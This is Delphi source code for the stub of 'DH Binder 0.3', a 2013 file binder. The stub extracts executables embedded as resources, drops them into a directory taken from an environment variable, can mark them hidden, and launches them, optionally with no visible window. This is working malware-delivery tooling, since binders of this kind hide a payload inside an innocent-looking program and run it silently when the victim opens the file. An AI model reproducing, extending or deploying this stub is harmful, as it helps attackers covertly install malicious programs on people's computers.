// DH Binder 0.3
// (C) Doddy Hackman 2013
// Credits :
// Joiner Based in : "Ex Binder v0.1" by TM
// Icon Changer based in : "IconChanger" By Chokstyle
// Thanks to TM & Chokstyle

// Stub

program stub;

uses
  Windows,
  SysUtils,
  ShellApi;

// Functions

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

//

// Start the game

function start(tres: THANDLE; cuatro, cinco: PChar; seis: DWORD): BOOL; stdcall;
var
  data: DWORD;
  uno: DWORD;
  dos: DWORD;
  cinco2: string;
  nombre: string;
  tipodecarga: string;
  ruta: string;
  ocultar: string;

begin

  Result := True;

  cinco2 := cinco;
  cinco2 := regex(cinco2, '[63686175]', '[63686175]');
  cinco2 := dhencode(cinco2, 'decode');
  cinco2 := LowerCase(cinco2);

  nombre := regex(cinco2, '[nombre]', '[nombre]');
  tipodecarga := regex(cinco2, '[tipo]', '[tipo]');
  ruta := GetEnvironmentVariable(regex(cinco2, '[dir]', '[dir]')) + '/';
  ocultar := regex(cinco2, '[hide]', '[hide]');

  data := FindResource(0, cinco, cuatro);

  uno := CreateFile(PChar(ruta + nombre), GENERIC_WRITE, FILE_SHARE_WRITE, nil,
    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
  WriteFile(uno, LockResource(LoadResource(0, data))^, SizeOfResource(0, data),
    dos, nil);

  CloseHandle(uno);

  if (ocultar = '1') then
  begin
    SetFileAttributes(PChar(ruta + nombre), FILE_ATTRIBUTE_HIDDEN);
  end;

  if (tipodecarga = 'normal') then
  begin
    ShellExecute(0, 'open', PChar(ruta + nombre), nil, nil, SW_SHOWNORMAL);
  end
  else
  begin
    ShellExecute(0, 'open', PChar(ruta + nombre), nil, nil, SW_HIDE);
  end;

end;

begin

  EnumResourceNames(0, RT_RCDATA, @start, 0);

end.

// The End ?
